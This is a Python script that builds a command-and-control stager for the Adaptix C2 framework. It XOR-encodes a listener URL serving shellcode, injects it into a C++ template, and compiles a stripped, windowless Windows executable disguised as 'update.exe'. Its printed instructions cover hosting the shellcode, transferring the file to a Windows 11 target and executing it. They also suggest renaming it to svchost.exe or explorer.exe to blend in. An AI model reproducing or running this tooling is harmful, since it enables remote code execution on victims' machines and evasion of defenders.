#!/usr/bin/env python3
import argparse
import subprocess
import os
import sys
import random

def xor_encrypt_string(s, key):
    return ''.join(chr(ord(c) ^ key) for c in s)

def main():
    parser = argparse.ArgumentParser(description="Generate Adaptix C2 Stager")
    parser.add_argument("-l", "--ip", required=True, help="Adaptix listener IP")
    parser.add_argument("-p", "--port", required=True, help="Adaptix listener port")
    parser.add_argument("-f", "--file", default="shellcode.bin", help="Shellcode filename")
    parser.add_argument("-o", "--output", default="update.exe", help="Output EXE name")
    parser.add_argument("--xorkey", type=int, default=0xAA, help="XOR key for obfuscation")
    args = parser.parse_args()
    
    # Build URL
    url = f"http://{args.ip}:{args.port}/{args.file}"
    print(f"[*] Using URL: {url}")
    
    # XOR encrypt URL
    encrypted = ''.join(chr(ord(c) ^ args.xorkey) for c in url)
    hex_bytes = ', '.join(f'0x{ord(c):02x}' for c in encrypted)
    
    # Read template
    with open("adaptix_stager.cpp", "r") as f:
        template = f.read()
    
    # Replace encrypted URL and XOR key
    modified = template.replace(
        'unsigned char encrypted_url[] = {',
        f'unsigned char encrypted_url[] = {{{hex_bytes}, 0x00'
    ).replace(
        'const char XOR_KEY = 0xAA;',
        f'const char XOR_KEY = 0x{args.xorkey:02x};'
    )
    
    # Write modified source
    with open("stager.cpp", "w") as f:
        f.write(modified)
    
    print("[*] Compiling with MinGW...")
    
    # Compile with optimizations and stripping
    compile_cmd = (
        "x86_64-w64-mingw32-g++ -static "
        "-Os -s -ffunction-sections -fdata-sections "
        "-Wl,--gc-sections -Wl,--strip-all "
        "-o stager.exe stager.cpp "
        "-lwininet -mwindows "
        "-fno-exceptions -fno-rtti"
    )
    
    result = subprocess.run(compile_cmd, shell=True, capture_output=True)
    
    if result.returncode != 0:
        print(f"[!] Compilation failed: {result.stderr.decode()}")
        sys.exit(1)
    
    # Rename output
    if args.output != "stager.exe":
        os.rename("stager.exe", args.output)
    
    print(f"\n[+] Success! Generated: {args.output}")
    print(f"[*] File size: {os.path.getsize(args.output)} bytes")
    print(f"\n[!] Next steps:")
    print(f"    1. Host your Adaptix shellcode as {args.file}")
    print(f"    2. Run: python3 -m http.server {args.port}")
    print(f"    3. Transfer {args.output} to Windows 11")
    print(f"    4. Execute: {args.output}")
    print(f"\n[!] To make persistent: rename to svchost.exe or explorer.exe")

if __name__ == "__main__":
    main()